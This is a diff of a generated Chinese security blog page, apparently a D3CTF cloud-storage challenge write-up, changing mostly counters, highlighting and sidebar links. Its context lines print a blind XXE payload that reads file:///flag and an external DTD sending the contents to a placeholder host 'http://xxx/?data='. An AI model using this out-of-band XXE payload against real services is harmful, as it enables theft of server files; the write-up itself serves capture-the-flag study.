@@ -158,7 +158,7 @@
         </div>
         <div class="article-info profile-block">
             <div class="article-info-block">
-                41
+                42
                 <span>文章</span>
             </div>
             <div class="article-info-block">
@@ -299,7 +299,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">POST</span> <span class="string">/upload</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: fn10051969.serverless.cloud.d3ctf.io</div><div class="line"><span class="attribute">User-Agent</span>: xxx</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</div><div class="line"><span class="attribute">Referer</span>: http://69889ba1b2.real-cloud-storage.d3ctf.io/</div><div class="line"><span class="attribute">Content-Type</span>: application/json</div><div class="line"><span class="attribute">Origin</span>: http://69889ba1b2.real-cloud-storage.d3ctf.io</div><div class="line"><span class="attribute">Content-Length</span>: 82</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"><span class="attribute">DNT</span>: 1</div><div class="line"><span class="attribute">Sec-GPC</span>: 1</div><div class="line"></div><div class="line">&#123;"endpoint":"xxx_url","key":"xxx","bucket":"xxx","file":"xxx"&#125;</div></pre></td></tr></table></figure>
 <p>开始的时候没啥头绪，尝试直接访问oss，发现返回了XML。猜测客户端将文件发送到oss，之后oss返回的XML会被客户端解析，所以可能有XXE。</p>
 <p>直接一波老生常谈的XXE盲打（oss伪造服务器使用<a href="https://requestrepo.com/" class="uri" target="_blank" rel="external">https://requestrepo.com/</a>搭建， <code>Content-Type</code> 改为 <code>application/xml</code> ，注意！要把状态码改为404，因为原oss就是返回了404，否则客户端不会解析XML）：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0"?&gt; </div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://xxx/data.dtd"&gt;</span></div><div class="line"><span class="meta">%dtd; %payload; %send;</span></div><div class="line"><span class="meta">]&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></div><div class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://xxx/data.dtd"&gt;</span></div><div class="line"><span class="meta">%dtd; %payload; %send;</span></div><div class="line"><span class="meta">]&gt;</span></div></pre></td></tr></table></figure>
 <p>vps:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxx/?data=%file;'&gt;"&gt;</div></pre></td></tr></table></figure>
 <p>把endpoint改为requestrepo的url之后在apache日志中找到flag：</p>
@@ -527,6 +527,25 @@
                     <li>
                         
                         <div class="item-thumbnail">
+                            <a href="/posts/Web安全/20220325-fastjson.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="Fastjson 1.2.24反序列化漏洞浅析" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
+                            <p class="item-title"><a href="/posts/Web安全/20220325-fastjson.html" class="title">Fastjson 1.2.24反序列化漏洞浅析</a></p>
+                            <p class="item-date"><time datetime="2022-03-25T09:09:42.000Z" itemprop="datePublished">2022-03-25</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
                             <a href="/posts/Web安全/20220307-log4shell.html" class="thumbnail">
     
     
@@ -600,25 +619,6 @@
                         </div>
                     </li>
                 
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/posts/Web安全/20201126-wdbunfinish.html" class="thumbnail">
-    
-    
-        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区" class="thumbnail-image"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
-                            <p class="item-title"><a href="/posts/Web安全/20201126-wdbunfinish.html" class="title">[网鼎杯2018]Unfinish-二次注入和insert注入的一个误区</a></p>
-                            <p class="item-date"><time datetime="2020-11-26T08:47:27.000Z" itemprop="datePublished">2020-11-26</time></p>
-                        </div>
-                    </li>
-                
             </ul>
         </div>
     </div>
@@ -628,7 +628,7 @@
     <div class="widget-wrap">
         <h3 class="widget-title">标签</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li></ul>
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li></ul>
         </div>
     </div>
 
